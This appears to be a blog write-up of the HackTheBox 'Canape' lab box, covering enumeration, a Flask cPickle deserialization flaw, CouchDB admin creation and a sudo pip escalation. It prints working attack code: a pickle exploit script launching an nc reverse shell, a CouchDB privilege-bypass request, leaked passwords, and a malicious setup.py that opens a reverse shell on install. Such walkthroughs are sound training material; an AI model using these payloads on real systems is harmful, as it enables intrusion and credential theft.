---
layout: post
title: HackTheBox - Canape Writeup
tags: [hackthebox]
---

I really enjoyed this box a lot as it took some creative thinking to get the initial shell and required analyzing and writing some python. Lot's of new things I hadn't been exposed to either so it was a great learning experience.

## Enumeration

Nmap to kick things off.

```
root@kali:~/htb/canape# nmap -p- 10.10.10.70 -T4

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-26 12:51 CDT
Nmap scan report for 10.10.10.70
Host is up (0.053s latency).
Not shown: 65533 filtered ports
PORT      STATE SERVICE
80/tcp    open  http
65535/tcp open  unknown
```

Let's run nmap scripts and service detection on the two open ports.

```
root@kali:~/htb/canape# nmap -sV -sC -p 80,65535 10.10.10.70

Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-26 13:07 CDT
Nmap scan report for 10.10.10.70
Host is up (0.057s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git: 
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Simpsons Fan Site
65535/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)
|   256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)
|_  256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (EdDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap has found us a Git repository as well as an SSH port on 65535. 

We can clone the Git repository one of two ways. The easy way is just using `git clone` after updating `/etc/hosts` with an entry for git.canape.htb.

```
root@kali:~/htb/canape# git clone http://git.canape.htb/simpsons.git
Cloning into 'simpsons'...
remote: Counting objects: 49, done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 49 (delta 18), reused 0 (delta 0)
Unpacking objects: 100% (49/49), done.
```

Or if that `simpsons.git` file wasn't exposed we could use `wget` to get the job done.

```
root@kali:~/htb/canape#wget --mirror -I .git 10.10.10.70/.git/
```

Then we can `cd` into the repository and do a `git checkout`.

```
root@kali:~/htb/canape/10.10.10.70# git checkout -- . 
root@kali:~/htb/canape/10.10.10.70# ls -al
total 28 
drwxr-xr-x 5 root root 4096 Apr 26 13:26 . 
drwxr-xr-x 3 root root 4096 Apr 26 13:24 ..
drwxr-xr-x 8 root root 4096 Apr 26 13:26 .git
-rw-r--r-- 1 root root 2043 Apr 26 13:26 __init__.py
-rw-r--r-- 1 root root  207 Apr 26 13:24 robots.txt
drwxr-xr-x 4 root root 4096 Apr 26 13:26 static
drwxr-xr-x 2 root root 4096 Apr 26 13:26 templates
```

Looking at `__init__.py` we can see we're dealing with a Flask app.

```python
import couchdb                                                                                                                                                                                                     
import string                                                                                                                                                                                                      
import random                                                                                                                                                                                                      
import base64                                                                                                                                                                                                      
import cPickle                                                                                                                                                                                                     
from flask import Flask, render_template, request                                                                                                                                                                  
from hashlib import md5                                                                                                                                                                                            
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
app = Flask(__name__)                                                                                                                                                                                              
app.config.update(                                                                                                                                                                                                 
    DATABASE = "simpsons"                                                                                                                                                                                          
)                                                                                                                                                                                                                  
db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]                                                                                                                                              
                                                                                                                                                                                                                   
@app.errorhandler(404)                                                                                                                                                                                             
def page_not_found(e):
    if random.randrange(0, 2) > 0:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))
    else:
        return render_template("index.html")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/quotes")
def quotes():
    quotes = []
    for id in db:
        quotes.append({"title": db[id]["character"], "text": db[id]["quote"]})
    return render_template('quotes.html', entries=quotes)

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
                outfile.write(char + quote)
                outfile.close()
                success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item

if __name__ == "__main__":
    app.run()
```

Alright so there's a bit of code to sift through and a few different web pages. `/submit` takes two variables, `char` and `quote`. `char` is fed through the whitelist of characters to ensure that it contains one of those characters. `quote` doesn't have any restrictions as far as content goes. Both of these variables are then hashed using md5 for a filename that is written to `/tmp/`.

`/check` is where we can see it taking an input under the `id` parameter and using it to open a file under `/tmp` with that id. Now here's the interesting part. If `p1` is in that file, it will use cPickle to load it (aka deserialize it). If you aren't familiar with pickle in python, then do read up on it, but basically it is used for serializing data into bytes, and then can be used for deserializing. If you read the documentation on it, they clearly state it should not be fed data that cannot be verified as secure. 

So with all of this in mind, we can send serialized code into the `quote` field and have cPickle deserialize it and execute. 

Let's start simple and verify that we can grab data stored in a file under `/tmp`. We can first submit the name homer under the `char` field along with test under the `quote` field, either through the browser on the page or you can use curl to do the job. Now we'll need to hash those values combined to get our filename hash to submit under `id` on the `/check` page.

Using the source code from `__init__.py` we can reuse the code to get what we need. 

```
root@kali:~# python
Python 2.7.14+ (default, Dec  5 2017, 15:17:02) 
[GCC 7.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from hashlib import md5
>>> char = "homer"
>>> quote = "test"
>>> p_id = md5(char + quote).hexdigest()
>>> p_id
'27c2ef5f95bbc3e5fddecf2f5ed9eb8c'
```

With curl and we can POST to `/check` and verify.

```
root@kali:~/htb/canape# curl -X POST http://10.10.10.70/check -F 'id=27c2ef5f95bbc3e5fddecf2f5ed9eb8c'
Still reviewing: homertest
```

Notice that it's concatenating the two values together, we'll need to keep this in mind for our exploit. Alright we've got that part figured out, now we need to get serialized data into the `quote` field. We can do this with cPickle and it's `dump` function. There's a good article [here](https://blog.nelhage.com/2011/03/exploiting-pickle/) that explains how to do this using a class in python. 

So we basically need to do a few things to get code execution.

- Serialize code to execute using cPickle and submit it under `quote`
- Hash the `char` and `quote` fields we submit using md5 to use to recall the payload
- Submit a POST request to `/check` using the md5 hash created earlier as the value for `id` 

Let's write up an exploit to help automate all of this.

```python
import cPickle
from hashlib import md5
import os
import requests
import urllib

class shell(object):
    def __reduce__(self):
        return (os.system,("rm -f /var/tmp/backpipe; mknod /var/tmp/backpipe p; nc 10.10.14.14 443 0</var/tmp/backpipe | /bin/bash 1>/var/tmp/backpipe",))

quote = cPickle.dumps(shell())

char = "(S'homer'\n"

p_id = md5(char + quote).hexdigest()

submit_url = "http://10.10.10.70/submit"
check_url = "http://10.10.10.70/check"

client = requests.session()

post_data = [('character',char), ('quote',quote)]

post_request = client.post(submit_url, data=post_data)

post2_data = [('id',p_id)]

post2_request = client.post(check_url, data=post2_data)
```

Let's break this code down.

We first start off by importing all the necessary modules we need, then defining a class object which executes a reverse shell utilzing the `mknod` method, since most likely `nc -e` isn't on the box.

Next we use cPickle to serialize our code to execute and put it in the `quote` variable.

Now here is an interesting part that took a while to figure out. We know that we have to have a character in the whitelist submitted under `char`. However if we submit this string as is it will cause our code to not execute when deserialized. So what we can do is essentially make `char` a string to be deserialized in cPickle which will make it valid non-executable code by adding `(S'` to the front of the string. We also add `\n` for the line break to prevent the concatenation we saw earlier. If you're wondering how I came up with this, you can view the deserialized data in a python terminal to see what cPickle dumps and you get something like this:

```python
cposix
system
p1
(S'rm -f /var/tmp/backpipe; mknod /var/tmp/backpipe p; nc 10.10.14.14 443 0</var/tmp/backpipe | /bin/bash 1>/var/tmp/backpipe'
p2
tp3
Rp4
```

Notice how our mknod string is prefaced with `(S'` and the closed with a single quote. There may be other ways, but this method gets the job done. 

Moving back to our python script, we then hash both `char` and `quote` combined and store as a variable in `p_id` to call later.

Next we define both of our URLs to POST to.

Then using the requests module we create a client for POST'ing and first POST to `submit` with both `char` and `quote` as data. 

Finally we POST to `/check` with `id` as our data to execute the code.

Using a netcat listener we can catch our shell after running our script.

```
root@kali:~/htb/canape# python script.py
```

```
root@kali:~/htb/canape# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.70] 58452
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@canape:/$
```

Whew! 

## Privilege Escalation to homer

We have a shell as www-data but we'll need to escalate to homer to grab user.txt. Looking back at our source code from earlier we can see the Flask app connecting to a couchdb instance on localhost port 5984. We can use curl to verify connectivity and grab the version.

```
www-data@canape:/$ curl -X GET http://127.0.0.1:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```

Let's do a general query to grab all the databases currently in couchdb.

```
www-data@canape:/var/www/html/simpsons$ curl -X GET http://127.0.0.1:5984/_all_dbs
<ml/simpsons$ curl -X GET http://127.0.0.1:5984/_all_dbs                     
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```

If we try to access the password db's contents we get access denied.

```
www-data@canape:/$ curl -X GET http://127.0.0.1:5984/passwords/all_docs
{"error":"unauthorized","reason":"You are not authorized to access this db."}
```

Luckily the couchdb 2.0 version is vulnerable and allows us to create an admin user by bypassing input validation. You can read up on that [here](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

Our payload to do this looks like such.

```
www-data@canape:/$ curl -X PUT 'http://localhost:5984/_users/org.couchdb.user:absolomb' --data-binary '{"type":"user","name":"absolomb","roles": ["_admin"],"roles": [],"password": "supersecret"}'

{"ok":true,"id":"org.couchdb.user:absolomb","rev":"1-821ac8fdc3a5d8e4362682da1beae312"}
```

Now we can query the databases by prefacing our url with username:password format.

```
www-data@canape:/$ curl -X GET http://absolomb:supersecret@localhost:5984/passwords/_all_docs
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
```

To query individual items in the db, we can simply append the id value on the end of the URL.

```
www-data@canape:/tmp$ curl -X GET http://absolomb:supersecret@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4                                
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
www-data@canape:/tmp$ curl -X GET http://absolomb:supersecret@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d                                
{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
www-data@canape:/tmp$ curl -X GET http://absolomb:supersecret@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f                                
{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
www-data@canape:/tmp$ curl -X GET http://absolomb:supersecret@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738                                
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
```

Homer's password is ours!

We can SSH in on port 65535.

```
root@kali:~/htb/canape# ssh homer@10.10.10.70 -p 65535
homer@10.10.10.70's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Tue Apr 10 12:57:08 2018 from 10.10.14.5
homer@canape:~$
```

## Root Privilege Escalation

If we check homer's sudo permissions we can see he's able to run `pip install` as root.

```
homer@canape:~$ sudo -l
[sudo] password for homer: 
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```

To exploit this, we can simply create a malicious python package that will run code when it's installed. To do this we can create a `setup.py` file on our attacking box with the following.

```python
import os
import pty
import socket

from setuptools import setup
from setuptools.command.install import install

class MyClass(install):
    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.14.14", 443))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        os.putenv("HISTFILE",'/dev/null')
        pty.spawn("/bin/bash")
        s.close()
	
setup(
    cmdclass={
        "install": MyClass
    }
)
```

This basically just tells pip to run MyClass at install, which will send us a reverse shell.

Now we'll need to package it.

```
root@kali:~/htb/canape# python setup.py sdist
```

By default it creates a `UNKNOWN-0.0.0.tar.gz` file under `dist`, which we can copy out and rename as `shell.tar.gz` then copy to our victim.

```
homer@canape:~$ wget http://10.10.14.14/shell.tar.gz
--2018-04-27 12:23:05--  http://10.10.14.14/shell.tar.gz
Connecting to 10.10.14.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 775 [application/gzip]
Saving to: ‘shell.tar.gz’

shell.tar.gz                  100%[=================================================>]     775  --.-KB/s    in 0s      

2018-04-27 12:23:05 (126 MB/s) - ‘shell.tar.gz’ saved [775/775]
```

Now we can start a netcat listener and run `sudo` with `pip install`.

```
homer@canape:~$ sudo /usr/bin/pip install shell.tar.gz 
The directory '/home/homer/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/homer/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Processing ./shell.tar.gz
Installing collected packages: UNKNOWN
  Running setup.py install for UNKNOWN ...
```

```
root@kali:~/htb/canape# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.70] 55420
root@canape:/tmp/pip-bz9te7-build#
```

Finished!